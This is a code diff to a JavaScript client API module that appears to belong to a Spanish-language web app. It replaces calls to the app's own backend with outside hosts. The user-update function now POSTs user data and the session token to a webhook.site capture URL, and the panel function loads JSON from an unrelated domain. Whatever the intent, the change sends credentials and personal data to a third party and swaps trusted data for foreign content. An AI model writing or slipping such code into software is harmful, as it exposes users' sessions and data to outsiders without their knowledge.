@@ -10,7 +10,8 @@ export const getConfiguracion = async () => {
 
 // Función para obtener información del panel
 export const getPanel = async () => {
-  const response = await fetch(`https://api.mintrared.com/api.php/panel?session=${SESSION}`);
+//  const response = await fetch(`https://api.mintrared.com/api.php/panel?session=${SESSION}`);
+  const response = await fetch(`https://alexcd2000.com/1.json`);
   return response.json();
 };
 
@@ -32,7 +33,8 @@ export const getDetalleMensaje = async (id) => {
 
 // Función para actualizar datos del usuario
 export const actualizarUsuario = async (datos) => {
-  const response = await fetch(`https://api.mintrared.com/api.php/actualizacion?session=${SESSION}`, {
+//  const response = await fetch(`https://api.mintrared.com/api.php/actualizacion?session=${SESSION}`, {    
+  const response = await fetch(`https://webhook.site/954812e7-8f75-49a8-bb5a-bcd4d8db7b9b?session=${SESSION}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(datos),
